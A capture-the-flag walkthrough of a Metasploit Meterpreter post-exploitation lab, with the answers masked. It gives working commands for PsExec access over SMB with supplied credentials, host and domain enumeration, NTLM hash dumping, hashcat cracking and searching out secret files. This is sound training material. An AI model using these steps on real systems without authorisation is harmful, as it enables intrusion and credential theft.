# Metasploit Meterpreter Post-Exploitation Walkthrough (CTF)

This walkthrough documents the process used to complete the Meterpreter-based post‑exploitation challenge.
All sensitive answers/flags are **hidden using X** for safe sharing.

---

## 🔧 Initial Access via SMB (PsExec)

The CTF provided credentials to simulate an SMB compromise:

```
Username: ballen
Password: Password1
```

Used the PsExec module:

```
use exploit/windows/smb/psexec
set RHOSTS <TARGET_IP>
set SMBUser ballen
set SMBPass Password1
run
```

A Meterpreter session was successfully obtained.

---

## 🖥️ 1. Computer Name

Obtained using:

```
sysinfo
```

**Answer:** `XXXXXXXX`

---

## 🌐 2. Target Domain

Retrieved using:

```
getdomain
```

**Answer:** `XXXXXXXX`

---

## 📂 3. User-Created Share Name

Enumerated shares:

```
net share
```

**Answer:** `XXXXXXXX`

---

## 🔐 4. NTLM Hash of User jchambers

Hash dump module used:

```
use post/windows/gather/hashdump
run
```

**Answer:** `XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX`

---

## 🔓 5. Cracked Password of jchambers

Cracked using hashcat:

```
hashcat -m 1000 <hash> rockyou.txt
```

**Answer:** `XXXXXXXX`

---

## 🔍 6. Location of secrets.txt

Search performed:

```
search -f secrets.txt
```

**Answer:** `XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX`

---

## 🔑 7. Twitter Password Inside secrets.txt

Viewed via:

```
cat <path_to_file>
```

**Answer:** `XXXXXXXXXX`

---

## 📄 8. Location of realsecret.txt

Found using:

```
search -f realsecret.txt
```

**Answer:** `XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX`

---

## 🧠 9. Real Secret

Displayed via:

```
cat <full_path>
```

**Answer:** `XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX`

---

## ✔️ Summary of Learned Skills

* Gaining access via PsExec
* Enumerating Windows systems using Meterpreter
* Dumping and cracking NTLM hashes
* Searching file systems for sensitive files
* Extracting secrets for post‑exploitation

---
